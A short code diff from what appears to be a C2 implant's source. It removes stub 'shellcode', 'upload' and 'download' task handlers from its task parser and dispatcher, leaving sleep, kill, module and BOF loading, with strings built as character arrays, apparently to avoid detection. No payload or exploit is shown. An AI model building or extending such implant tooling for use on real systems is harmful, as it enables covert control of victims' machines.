@@ -75,11 +75,6 @@ DWORD parse_task_type(const char *type_str, DWORD len) {
     char s_bof_load[]    = {'b','o','f','_','l','o','a','d',0};
     char s_bof[]         = {'b','o','f',0};
 
-    /* Legacy types (still supported but will migrate to bus) */
-    char s_shellcode[]   = {'s','h','e','l','l','c','o','d','e',0};
-    char s_upload[]      = {'u','p','l','o','a','d',0};
-    char s_download[]    = {'d','o','w','n','l','o','a','d',0};
-
     /* Built-in */
     if (streq_n(type_str, len, s_sleep))       return TASK_TYPE_SLEEP;
     if (streq_n(type_str, len, s_kill))        return TASK_TYPE_KILL;
@@ -95,11 +90,6 @@ DWORD parse_task_type(const char *type_str, DWORD len) {
     if (streq_n(type_str, len, s_module_load)) return TASK_TYPE_MODULE;
     if (streq_n(type_str, len, s_bof_load))    return TASK_TYPE_BOF;
     if (streq_n(type_str, len, s_bof))         return TASK_TYPE_BOF;
-
-    /* Legacy (kept for compat) */
-    if (streq_n(type_str, len, s_shellcode))   return TASK_SHELLCODE;
-    if (streq_n(type_str, len, s_upload))      return TASK_UPLOAD;
-    if (streq_n(type_str, len, s_download))    return TASK_DOWNLOAD;
 
     return 0;
 }
@@ -626,28 +616,9 @@ void execute_task(IMPLANT_CONTEXT *ctx, TASK *task) {
         execute_module_task(ctx, task);
         break;
 
-    /* ---- Legacy types (stubs) ---- */
-    case TASK_SHELLCODE:
-        /* TODO: migrate to module bus */
-        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
-        break;
-
-    case TASK_UPLOAD: {
-        /* TODO: migrate to module bus */
-        char msg[] = {'n','o','t',' ','i','m','p','l','e','m','e','n','t','e','d',0};
-        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, (BYTE*)msg, 15);
-        break;
-    }
-
-    case TASK_DOWNLOAD: {
-        /* TODO: migrate to module bus */
-        char msg[] = {'n','o','t',' ','i','m','p','l','e','m','e','n','t','e','d',0};
-        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, (BYTE*)msg, 15);
-        break;
-    }
-
     default:
-        /* Unknown task type — report failure */
+        /* Unknown or unimplemented task type — report failure.
+           Shellcode, upload, and download are handled via modules (bus). */
         store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
         break;
     }
